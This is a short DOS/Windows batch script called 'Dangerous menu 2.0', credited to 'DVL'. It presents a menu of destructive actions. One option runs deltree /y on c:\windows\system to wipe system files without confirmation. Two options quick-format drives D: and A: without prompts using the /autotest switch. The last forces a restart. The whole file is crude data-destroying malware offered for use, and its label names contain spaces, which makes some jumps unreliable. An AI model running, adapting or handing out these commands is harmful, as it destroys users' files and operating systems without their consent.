@echo off
:menu
echo                      Created by DVL
echo                Welcome 2 Dangerous menu 2.0
echo.
echo.
echo    MENU
echo    ====
echo.
echo    1 - Delete files from system folder
echo    2 - Format drive d
echo    3 - Format drive a
echo    4 - Restart computer
echo.
echo    Q - Quit
choice /c:1234Q>nul
if errorlevel 5 goto done
if errorlevel 4 goto Restart computer
if errorlevel 3 goto Format drive a
if errorlevel 2 goto Format drive d
if errorlevel 1 goto Delete files from system folder
echo CHOICE missing
goto done

:Delete files from system folder
deltree/y c:\windows\system\*.*
goto done

:Format drive d
format d:/q/u/autotest
goto menu

:Format drive a
format a:/q/u/autotest
goto menu

:Restart computer
Shutdown /RESTART

:done
cls